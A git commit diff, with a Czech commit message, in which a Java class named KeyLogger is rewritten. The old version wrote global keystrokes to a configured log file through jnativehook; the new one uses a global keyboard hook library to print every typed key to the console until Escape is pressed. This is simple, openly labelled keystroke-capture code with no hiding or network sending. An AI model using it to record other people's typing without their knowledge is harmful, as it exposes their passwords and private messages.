2772de716caab9863e7874073814033d4850677e
Rukes <samuel.kunert@seznam.cz>
2018-06-04 22:41:37 +0200

    nový key logger

--- src/main/java/keylogger/KeyLogger.java
+++ src/main/java/keylogger/KeyLogger.java
@@ -1,80 +1,44 @@
 package keylogger;
 
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.nio.file.Path;
-import java.nio.file.Paths;
-import java.util.Properties;
-import java.util.logging.FileHandler;
-import java.util.logging.Logger;
-import java.util.logging.SimpleFormatter;
+import lc.kra.system.keyboard.GlobalKeyboardHook;
+import lc.kra.system.keyboard.event.GlobalKeyAdapter;
+import lc.kra.system.keyboard.event.GlobalKeyEvent;
 
-import org.jnativehook.GlobalScreen;
-import org.jnativehook.NativeHookException;
-import org.jnativehook.keyboard.NativeKeyEvent;
-import org.jnativehook.keyboard.NativeKeyListener;
+import java.awt.*;
+import java.awt.event.KeyEvent;
 
-/**
- * Logs keystrokes in a log file.
- * @author Samir Joglekar
- */
-public class KeyLogger implements NativeKeyListener {
-    String configFilePath = null;
-    Logger logger = null;
-    FileHandler fileHandler = null;
-    SimpleFormatter simpleFormatter = null;
-    InputStream inputStream = null;
-    Properties properties = null;
-    Path currentRelativePath = null;
+public class KeyLogger {
 
-    /**
-     * The constructor.
-     * @throws IOException
-     */
-    public KeyLogger() throws IOException {
-        logger = Logger.getLogger("Key Log");
-        currentRelativePath = Paths.get("");
-        inputStream = new FileInputStream("Config.properties");
-        properties = new Properties();
-        properties.load(inputStream);
-        configFilePath = properties.getProperty("FilePath");
-        fileHandler = new FileHandler(configFilePath);
-        logger.addHandler(fileHandler);
-        simpleFormatter = new SimpleFormatter();
-        fileHandler.setFormatter(simpleFormatter);
-    }
+    private static boolean run = true;
+    private static boolean capsLock;
 
-    /**
-     * Overridden method to capture the pressed keys.
-     */
-    @Override
-    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
-        logger.info("Key pressed: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
-    }
+    public static void main(String[] args) {
+        capsLock = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
 
-    /**
-     * Overridden method to capture released keys.
-     */
-    @Override
-    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
-    }
+        GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);
+        keyboardHook.addKeyListener(new GlobalKeyAdapter() {
+            @Override
+            public void keyPressed(GlobalKeyEvent event) {
+                switch (event.getVirtualKeyCode()){
+                    case GlobalKeyEvent.VK_ESCAPE:
+                        run = false;
+                        return;
+                    case GlobalKeyEvent.VK_CAPITAL:
+                        capsLock = !capsLock;
+                        break;
+                    case GlobalKeyEvent.VK_BACK:
+                        break;
+                    case GlobalKeyEvent.VK_RETURN:
+                        System.out.println();
+                        break;
+                }
+                System.out.print(event.getKeyChar());
+            }
+        });
 
-    /**
-     * Overridden method to capture the typed keys.
-     */
-    @Override
-    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
-    }
-
-    /**
-     * The main method.
-     * @param arguments - Command-line arguments
-     * @throws IOException
-     * @throws NativeHookException
-     */
-    public static void main(String arguments[]) throws IOException, NativeHookException {
-        GlobalScreen.registerNativeHook();
-        GlobalScreen.addNativeKeyListener(new KeyLogger());
+        try {
+            while(run) Thread.sleep(128);
+        } catch(InterruptedException ignored) {}
+        finally { keyboardHook.shutdownHook(); }
     }
 }
